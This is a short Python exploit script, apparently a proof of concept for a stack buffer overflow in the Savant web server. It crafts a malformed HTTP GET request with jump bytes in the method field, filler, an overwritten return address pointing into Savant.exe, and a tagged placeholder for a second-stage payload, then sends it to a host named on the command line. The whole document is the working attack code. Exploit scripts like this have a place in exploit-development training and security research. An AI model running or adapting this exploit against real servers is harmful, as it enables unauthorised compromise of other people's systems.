#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 80
    size = 260

    # removed 00 0A 0D 25
    
    httpMethod = b'\x31\xc9\x85\xc9\x0f\x84\x0f' + b' /'  # Conditional jump in GET field
    inputBuffer = b'\x41' * 253  # Filler space
    inputBuffer += pack('<L', (0x418674))  # initial EIP redirection to Savant.exe
    httpEndRequest = b'\r\n\r\n'  # End the HTTP request
    httpEndRequest += b'VUGUBRAHXD' + b'\x42' * 1000  # Signifier and Stage 2 payload?
    
    buffer = httpMethod + inputBuffer + httpEndRequest
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    s.close()

    print("Fin!")

except socket.error:
    print("No se puede conectar.") 
